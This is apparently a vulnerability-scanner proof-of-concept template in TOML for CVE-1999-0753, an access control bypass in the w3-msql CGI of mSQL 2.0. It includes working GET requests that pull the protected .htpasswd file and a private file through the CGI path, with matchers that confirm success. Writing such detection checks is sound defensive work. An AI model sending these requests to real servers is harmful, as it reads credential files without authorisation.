[info]
author = "ave"
description = "检测 Hughes Technologies Mini SQL (mSQL) 2.0/2.0.10 中 w3-msql CGI 脚本的访问控制绕过漏洞。w3-msql 将表单数据自动转为全局 Lite 变量，导致攻击者可直接访问 .htaccess 保护的目录和文件，如 .htpasswd 文件。"
id = "POC-AVE-1999-0606"
name = "Hughes Technologies mSQL 2.0 w3-msql CGI Access Control Bypass PoC"
severity = "high"
tags = ["ave-1999-0606"]
vuln_id = [
    "CVE-1999-0753",
    "AVE-1999-0606",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/w3-msql/protected-directory/.htpasswd"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [":"]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/w3-msql/protected-directory/private-file"
protocol = "http"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = [
    "cannot open",
    "Error",
]
